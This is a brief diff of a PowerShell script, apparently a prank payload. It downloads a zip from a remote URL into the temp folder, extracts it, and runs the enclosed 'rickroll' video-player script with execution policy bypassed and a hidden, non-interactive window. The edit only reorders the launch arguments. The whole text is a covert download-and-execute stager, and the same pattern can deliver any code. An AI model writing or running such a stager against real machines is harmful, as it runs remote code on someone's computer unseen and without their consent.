@@ -3,4 +3,5 @@ $Z="$env:TMP"+'\Windows-rickroll-vido.zip'
 $D="$env:TMP"+'\Windows-rickroll-video'
 iwr -Uri $U -O $Z;Expand-Archive $Z -DestinationPath $D\ -Force
 $c= join-path $d -childpath /Windows-rickroll-vido/Windows-rickroll-video-player.ps1
-powershell $c -exec Bypass -w h -NoP -NonI
+
+powershell -exec Bypass -w h -NoP -NonI $c
